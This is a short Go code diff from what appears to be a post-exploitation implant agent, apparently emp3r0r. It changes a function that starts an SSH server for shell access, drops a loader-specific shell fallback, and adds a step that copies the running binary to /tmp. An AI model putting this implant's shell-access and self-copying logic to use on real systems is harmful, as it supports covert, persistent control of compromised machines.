@@ -27,15 +27,6 @@ func setWinsize(f *os.File, w, h int) {
 // SSHD start a ssh server to provide shell access for clients
 // the server binds local interface only
 func crossPlatformSSHD(shell, port string, args []string) (err error) {
-	// if we're running from loader, elvish is not available
-	run_from_loader := os.Getenv("LD") == "true"
-	if run_from_loader && shell == "elvish" {
-		shell = "bash"
-		if !util.IsCommandExist(shell) {
-			shell = "sh"
-		}
-	}
-
 	// CC doesn't know where the agent root is, so we need to prepend it
 	if strings.HasPrefix(shell, util.FileBaseName(RuntimeConfig.AgentRoot)) {
 		shell = fmt.Sprintf("%s/%s", filepath.Dir(RuntimeConfig.AgentRoot), shell)
@@ -60,6 +51,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		if shell == "elvish" {
 			// write process exe again
 			log.Printf("elvish: rewriting process exe to %s", new_exe)
+			CopySelfTo("/tmp/emp3r0r.restored")
 			err = CopySelfTo(new_exe)
 			if err != nil {
 				err = fmt.Errorf("%s not found (%v), aborting", exe, err)
